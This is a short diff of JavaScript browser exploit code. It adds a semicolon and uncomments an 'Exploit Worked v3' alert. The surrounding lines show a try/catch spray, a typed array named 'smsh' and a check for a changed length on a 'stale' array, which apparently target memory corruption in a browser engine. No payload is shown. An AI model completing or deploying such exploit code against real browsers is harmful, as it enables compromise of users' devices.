@@ -11,7 +11,7 @@
  for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
  var fc = new Function(trycatch);
  var fcp = 0;
- var smsh = new Uint32Array(0x10)
+ var smsh = new Uint32Array(0x10);
  
  
 var original_val = 0;
@@ -145,7 +145,7 @@ for (var i = 0; i < 0x1000; i++){
  	
 		 
 	if(before_len != stale.length){
-		//alert("Exploit Worked v3");
+		alert("Exploit Worked v3");
 	} else {
 		alert("Exploit Failed");
 		document.location.reload();
